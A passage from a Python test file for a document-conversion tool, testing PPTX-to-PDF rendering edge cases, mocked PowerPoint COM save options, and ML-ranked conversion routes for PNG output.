    r_tight = sh_tight.text_frame.paragraphs[0].add_run()
    r_tight.text = "TightBoxLabel"
    r_tight.font.size = Pt(8.5)

    # 4. Moved group shape -> child renders near group x=6in (~432pt), not origin
    grp = sl.shapes.add_group_shape()
    g_tb = grp.shapes.add_textbox(Inches(0.0), Inches(0.0), Inches(3.0), Inches(0.7))
    g_tb.text_frame.text = "MovedGroupText"
    grp.left = Inches(6.0)
    grp.top = Inches(1.0)

    # 5. Multi-run with empty leading run + Unicode bullet + Arabic
    sh_uni = sl.shapes.add_textbox(Inches(0.5), Inches(3.2), Inches(5.0), Inches(0.8))
    p_uni = sh_uni.text_frame.paragraphs[0]
    p_uni.add_run().text = ""
    r_u2 = p_uni.add_run()
    r_u2.text = "\u2022 \u0645\u0631\u062d\u0628\u0627 Hello"
    r_u2.font.size = Pt(15)

    src = tmp_path / "edge.pptx"
    out_pdf = tmp_path / "edge.pdf"
    prs.save(src)
    conv_pptx_to_pdf(src, out_pdf)

    doc = fitz.open(str(out_pdf))
    try:
        pg = doc[0]
        txt = pg.get_text("text")
        assert "ThemeBoxLabel" in txt
        assert "ContrastGuardedText" in txt
        assert "TightBoxLabel" in txt
        assert "MovedGroupText" in txt
        assert "Hello" in txt and "?" not in txt
        assert any("\u0600" <= ch <= "\u06FF" or "\uFE70" <= ch <= "\uFEFF" for ch in txt)
        assert len(pg.get_drawings()) >= 1  # theme fill rectangle drawn

        # Verify contrast-guarded span is NOT 0xffffff and MovedGroupText is shifted right
        for blk in pg.get_text("dict")["blocks"]:
            for ln in blk.get("lines", []):
                for sp in ln.get("spans", []):
                    if "ContrastGuardedText" in sp["text"]:
                        assert sp["color"] != 0xFFFFFF
                    if "MovedGroupText" in sp["text"]:
                        assert sp["bbox"][0] >= 380.0
    finally:
        doc.close()


def test_pptx_office_com_powerpoint_options(tmp_path, monkeypatch):
    """PowerPoint COM uses DisplayAlerts=1 (ppAlertsNone), ReadOnly=-1, ODP=35, and joins on shutdown."""
    import sys
    import types
    from typing import Any
    import clickshift.engine as eng_mod

    src = tmp_path / "sample.pptx"
    src.write_bytes(b"PK\x03\x04dummy")
    calls: dict[str, Any] = {"attrs": [], "open": None, "saveas": [], "closed": 0, "quit": 0}

    class FakePres:
        def SaveAs(self, path: str, fmt: int) -> None:
            calls["saveas"].append((path, fmt))
            Path(path).write_bytes(b"fake_office_out")

        def Close(self) -> None:
            calls["closed"] += 1

    class FakePresentations:
        def Open(self, path: str, **kwargs: Any) -> FakePres:
            calls["open"] = (path, kwargs)
            return FakePres()

    class FakePptApp:
        Presentations = FakePresentations()

        def __setattr__(self, name: str, val: Any) -> None:
            calls["attrs"].append((name, val))
            if name in ("Visible", "ScreenUpdating"):
                raise RuntimeError(f"PowerPoint rejects {name}")
            object.__setattr__(self, name, val)

        def Quit(self) -> None:
            calls["quit"] += 1

    fake_win32_client: Any = types.ModuleType("win32com.client")
    fake_win32_client.DispatchEx = lambda progid: FakePptApp()
    fake_win32: Any = types.ModuleType("win32com")
    fake_win32.client = fake_win32_client
    fake_pythoncom: Any = types.ModuleType("pythoncom")
    fake_pythoncom.CoInitialize = lambda: None
    fake_pythoncom.CoUninitialize = lambda: None

    monkeypatch.setitem(sys.modules, "win32com", fake_win32)
    monkeypatch.setitem(sys.modules, "win32com.client", fake_win32_client)
    monkeypatch.setitem(sys.modules, "pythoncom", fake_pythoncom)
    monkeypatch.setattr(eng_mod, "IS_WINDOWS", True)
    monkeypatch.setattr(eng_mod.BACKENDS, "office_app", {"powerpoint": "PowerPoint.Application"})

    worker = eng_mod._OfficeStaWorker("powerpoint", "PowerPoint.Application")
    pool = eng_mod._OfficeComPool()
    pool._workers["powerpoint"] = worker
    monkeypatch.setattr(eng_mod, "_OFFICE_POOL", pool)

    try:
        eng_mod.conv_office_com(src, tmp_path / "out.odp")
        eng_mod.conv_office_com(src, tmp_path / "out.pdf")
        eng_mod.conv_office_com(src, tmp_path / "out.ppt")
    finally:
        pool.shutdown()

    assert ("DisplayAlerts", 1) in calls["attrs"]
    assert ("DisplayAlerts", 0) not in calls["attrs"]
    assert calls["open"] is not None
    assert calls["open"][1] == {"ReadOnly": -1, "Untitled": 0, "WithWindow": 0}
    assert [fmt for _, fmt in calls["saveas"]] == [35, 32, 1]
    assert calls["closed"] == 3
    assert calls["quit"] == 1


def test_paged_images_uses_ranked_pdf_routes(tmp_path, monkeypatch):
    """PPTX -> PNG conversion must consult ML ranking instead of retrying a slow failed PDF backend."""
    import clickshift.engine as eng_mod
    import pptx

    prs = pptx.Presentation()
    prs.slides.add_slide(prs.slide_layouts[0]).shapes.title.text = "Ranked PNG Slide"
    src = tmp_path / "ranked.pptx"
    prs.save(src)

    monkeypatch.setenv("CLICKSHIFT_HOME", str(tmp_path / "cs_home"))
    monkeypatch.setenv("CLICKSHIFT_DISABLE_CLOUD", "1")
    monkeypatch.setattr(eng_mod.BACKENDS, "office_app", {})
    monkeypatch.setattr(eng_mod.BACKENDS, "libreoffice", None)

    eng = eng_mod.ConversionEngine(
        enable_ml=True,
        history_file=tmp_path / "cs_home" / "history.jsonl",
    )
    ranked_seen: list[str] = []
    orig_rank = eng._selector.rank

    def spy_rank(s, dst, routes, **kw):
        ranked_seen.append(dst)
        return orig_rank(s, dst, routes, **kw)

    monkeypatch.setattr(eng._selector, "rank", spy_rank)
    try:
        res = eng.convert(src, "png")
    finally:
        eng.shutdown()

    assert res.ok, res.error
    assert ".pdf" in ranked_seen
    assert (tmp_path / "ranked" / "page_001.png").exists()







